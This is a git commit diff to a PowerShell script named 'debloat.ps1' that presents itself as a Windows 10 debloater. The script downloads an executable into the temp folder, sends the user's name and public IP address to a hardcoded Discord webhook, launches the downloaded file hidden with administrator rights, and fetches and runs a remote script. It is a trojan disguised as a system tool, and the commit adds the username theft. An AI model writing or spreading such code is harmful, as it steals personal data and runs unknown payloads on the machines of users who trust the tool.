1a9280b14b616a26bd38bec8438d0a9b1cc0f7aa
Dazd <87366355+Dazd-Pkz@users.noreply.github.com>
2022-08-13 23:54:21 +0200

    Update debloat.ps1

--- debloat.ps1
+++ debloat.ps1
@@ -1,12 +1,10 @@
 iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/saucisson.exe" -o $env:TEMP\saucisson.exe
 
 $hookUrl = 'https://discord.com/api/webhooks/1007602451702087793/iOOKR4A2rDTjBNiy5QlsHj7EInFqpiQTvbCHVxrh9KtaOKW9VSxrY0xbb951XAWoQSbQ'
-$MyIP = (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content
-
-$payload = [PSCustomObject]@{
-    content = (Invoke-WebRequest -useb -uri "http://ifconfig.me/ip").Content
+$Body = @{
+  'content' = "Username : $env:UserName`nIP : " + (Invoke-WebRequest -useb -uri "http://ifconfig.me/ip").Content
 }
-Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json)
+Invoke-RestMethod -useb -Uri $hookUrl -Method 'post' -Body $Body
 
 Start-Process -Verb RunAs -WindowStyle hidden -FilePath $env:TEMP\saucisson.exe
 iwr -useb git.io/debloat|iex
